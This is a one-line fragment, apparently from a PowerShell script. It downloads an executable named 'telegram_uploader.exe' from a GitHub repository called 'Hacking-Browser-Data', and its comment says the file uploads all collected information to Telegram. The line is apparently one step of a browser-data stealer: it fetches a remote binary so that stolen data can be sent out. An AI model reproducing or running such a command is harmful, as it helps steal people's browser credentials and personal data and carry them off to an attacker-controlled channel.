...
Invoke-WebRequest https://github.com/WajahatAliii/Hacking-Browser-Data/raw/main/telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
